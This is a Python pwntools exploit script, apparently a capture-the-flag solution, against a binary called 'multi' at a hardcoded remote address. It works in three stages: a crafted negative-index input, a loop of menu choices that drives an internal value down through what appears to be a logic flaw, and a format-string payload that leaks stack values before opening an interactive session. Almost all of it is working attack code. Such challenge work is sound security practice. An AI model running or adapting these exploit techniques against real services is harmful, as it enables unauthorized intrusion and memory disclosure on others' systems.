#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('multi')

host = args.HOST or '35.198.113.131'
port = int(args.PORT or 31337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x4015BF
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['gnome-terminal', '-e']

io = start()

# Stage 1.

print(io.recv())
io.sendline('-2 1335')

# Stage 2.

val = 10000
while val > 5000:
    io.recv()
    io.sendline('2')
    io.recv()
    io.sendline('250')
    print(io.recvline())
    val -= 250

io.recv()
io.sendline('2')
io.recv()
io.sendline('1')
print(io.recvline())
val -= 1

for i in range(3):
    io.recv()
    io.sendline('1')
    io.recv()
    io.sendline('250')
    print(io.recvline())
    val += 250

val += 4900

while val > 0:
    io.recv()
    io.sendline('2')
    io.recv()
    io.sendline('250')
    print(io.recvline())
    val -= 250

log.info('val: ' + str(val))

# Stage 3.

print(io.recv())
io.sendline('%25$p %26$p %27$p %28$p %29$p %30$p')

io.interactive()

